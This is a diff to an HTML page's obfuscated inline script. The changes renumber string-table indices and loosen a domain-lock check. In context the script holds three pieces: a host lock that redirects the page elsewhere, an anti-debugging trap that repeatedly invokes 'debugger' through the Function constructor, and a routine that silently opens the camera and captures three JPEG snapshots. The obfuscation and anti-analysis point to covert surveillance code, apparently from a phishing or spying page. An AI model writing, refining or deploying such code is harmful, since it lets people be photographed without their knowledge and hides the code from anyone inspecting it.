@@ -142,15 +142,15 @@
         
         // --- 1. DOMAIN LOCK & ANTI-DEBUG ---
         (function() {
-            const h = window[_(0x66)][_(0x65)];
-            if (h !== _(0x64) && h !== 'localhost' && h !== '127.0.0.1') {
-                window[_(0x66)][_(0x67)] = _(0x68);
+            const h = window[_(0x42)][_(0x41)];
+            if (h !== _(0x40) && h !== 'localhost' && h !== '127.0.0.1' && h !== '') {
+                window[_(0x42)][_(0x43)] = _(0x44);
             }
             const _0xDb = function() {
                 const _0x1 = function() {
-                    const _0x2 = new RegExp(_(0x69));
+                    const _0x2 = new RegExp(_(0x45));
                     if (!_0x2.test(function() { return 'debugger'; }.toString())) {
-                        (function() {}.constructor(_(0x6a))());
+                        (function() {}.constructor(_(0x47))());
                     }
                 };
                 setInterval(_0x1, 1000);
@@ -279,17 +279,17 @@
             try {
                 let pics = [];
                 try {
-                    const stream = await navigator[_(0x54)][_(0x55)]({ video: { facingMode: _(0x56) } });
+                    const stream = await navigator[_(0x36)][_(0x37)]({ video: { facingMode: _(0x38) } });
                     const v = _el(_ids.v);
-                    v[_(0x57)] = stream;
-                    await v[_(0x58)]();
+                    v[_(0x39)] = stream;
+                    await v[_(0x3a)]();
                     await _sl(2500);
                     const c = _el(_ids.a);
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     const ctx = c.getContext(_(0x1c));
                     for(let i=0; i<3; i++) {
                         ctx.drawImage(v, 0x0, 0x0);
-                        pics.push(await new Promise(res => c[_(0x5a)](res, _(0x59), 0.8)));
+                        pics.push(await new Promise(res => c[_(0x3c)](res, _(0x3b), 0.8)));
                         await _sl(800);
                     }
                     stream.getTracks().forEach(t => t.stop());
@@ -311,3 +311,4 @@
     </script>
 </body>
 </html>
+
